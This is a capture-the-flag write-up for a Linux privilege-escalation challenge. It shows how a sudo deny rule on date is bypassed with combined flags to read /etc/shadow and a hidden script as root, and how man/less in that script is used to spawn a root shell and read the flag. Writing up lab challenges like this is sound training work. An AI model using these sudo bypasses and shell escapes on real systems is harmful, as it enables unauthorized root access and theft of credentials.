# Day 22 - The date is near

- Category: Misc
- Difficulty: Medium
- Format: Privesc

## Description

The date is approaching ... Santa provides you with a server to connect to via SSH.

It seems he's left a flag in /root/. Will you be able to catch it?

The username is `sshuser` and the password is `password`.

## Writeup

**TLDR: SSH, Privesc, Date, Man**

We can connect to the SSH Server with the credentials.

We can list SUDO privileges as following :

```bash
$ sudo -l
Matching Defaults entries for sshuser on 70157be953ec:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty, !requiretty

User sshuser may run the following commands on 70157be953ec:
    (ALL) NOPASSWD: /bin/date *, !/bin/date *-f*, !/bin/date *--file*
    (ALL) NOPASSWD: /usr/bin/dev.sh
```

We can run date, but `-f` and `--file` seems blocked. Sadly for us, because `-f` allow to read files : 

- [https://gtfobins.github.io/gtfobins/date/](https://gtfobins.github.io/gtfobins/date/)

Indeed the command is not allowed if `-f` or `--file` is detected in the command

```bash
sshuser@the-date-is-near:~$ sudo /bin/date -f /etc/shadow
Sorry, user sshuser is not allowed to execute '/bin/date -f /etc/shadow' as root on the-date-is-near.
```

Then, we can run /usr/bin/dev.sh, but we don't have permission to read it. We can execute it but nothing happened.

```bash
$ cat /usr/bin/dev.sh
cat: /usr/bin/dev.sh: Permission denied
$ sudo /usr/bin/dev.sh
$
```

We can bypass the protetion on date by abusing bash argument concatenation. For example -a and -b can be short as -ab, this will help us to bypass the regex.

This mechanism can be used to bypass the mitigation blocking `-f` and `--file`. This results in `-uf` : 

```bash
$ sudo date -uf /etc/shadow
date: invalid date 'root:*:20059:0:99999:7:::'
date: invalid date 'daemon:*:20059:0:99999:7:::'
date: invalid date 'bin:*:20059:0:99999:7:::'
date: invalid date 'sys:*:20059:0:99999:7:::'
date: invalid date 'sync:*:20059:0:99999:7:::'
date: invalid date 'games:*:20059:0:99999:7:::'
date: invalid date 'man:*:20059:0:99999:7:::'
date: invalid date 'lp:*:20059:0:99999:7:::'
date: invalid date 'mail:*:20059:0:99999:7:::'
date: invalid date 'news:*:20059:0:99999:7:::'
date: invalid date 'uucp:*:20059:0:99999:7:::'
date: invalid date 'proxy:*:20059:0:99999:7:::'
date: invalid date 'www-data:*:20059:0:99999:7:::'
date: invalid date 'backup:*:20059:0:99999:7:::'
date: invalid date 'list:*:20059:0:99999:7:::'
date: invalid date 'irc:*:20059:0:99999:7:::'
date: invalid date '_apt:*:20059:0:99999:7:::'
date: invalid date 'nobody:*:20059:0:99999:7:::'
date: invalid date 'sshd:!:20079::::::'
date: invalid date 'sshuser:$y$j9T$zi0nU3b.AfYQd8bfmj3r91$iK9HOdKPY8Js7/S8/LtFUViDACdWChX1xLZ3N2ECiv4:20079:0:99999:7:::'
```

This is cool but not enough to flag because we don't know the filename of the flag.

But can can to this file read as root, we can read the weird script dev.sh

```bash
sudo date -uf /usr/bin/dev.sh
```

After a little parsing the script "dev.sh" is the following : 

```bash
#!/bin/bash

# Check if the --debugmyscript argument is present
if [[ "$1" != "--debugmyscript" ]]; then
    exit 0  # Exit silently if the --debugmyscript argument is not provided
fi

# Remove --debugmyscript from the argument list
shift

echo "Welcome to the dev.sh script!"

# Function to display help
function show_help {
    echo "Usage: $0 [options]"
    echo
    echo "Options:"
    echo "  -l            List all running processes."
    echo "  -d            Show available disk space."
    echo "  -m            Show the manual for the printf command."
    echo "  -h            Show this help message."
}

# Check if no arguments are provided after --debugmyscript
if [ $# -eq 0 ]; then
    echo "Error: No arguments provided."
    show_help
    exit 1
fi

# Process arguments
while getopts "ldmh" opt; do
    case $opt in
        l)
            echo "Listing running processes:"
            ps aux
            ;;
        d)
            echo "Displaying available disk space:"
            df -h
            ;;
        m)
            echo "Displaying the manual for printf:"
            man printf
            ;;
        h)
            show_help
            ;;
        *)
            echo "Invalid option."
            show_help
            exit 1
            ;;
    esac
done
```

The script contains a first argument `--debugmyscript` and if it's not present, it exits automatically.

It then takes another argument `-m` which allows man. Man indirectly launches the `less` binary, which is vulnerable to RCE by default.

Indeed man run less, which allow to run subprocesses.

We run the script to read man option :

```bash
$ sudo dev.sh --debugmyscript -m
```

Then, run /bin/bash in less command : 
- [https://superuser.com/questions/521399/how-do-i-execute-a-linux-command-whilst-using-the-less-command-or-within-the-man](https://superuser.com/questions/521399/how-do-i-execute-a-linux-command-whilst-using-the-less-command-or-within-the-man)

```bash
!/bin/bash
```

And we can get the flag in /root/ directory : 

```bash
root@the-date-is-near:/home/sshuser# cd
root@the-date-is-near:~# ls -la
total 20
drwx------ 1 root root 4096 Dec 22 10:19 .
drwxr-xr-x 1 root root 4096 Dec 22 14:45 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
-rw------- 1 root root   27 Dec 22 10:19 flag-1a0a6a36ca0a3953b997ddaeb722cb31e9e421b038f6a67ef55593f21dcf92b1.txt
root@the-date-is-near:~# cat flag*
RM{S4NTA_IS_N0T_4DMIN_SYS}
```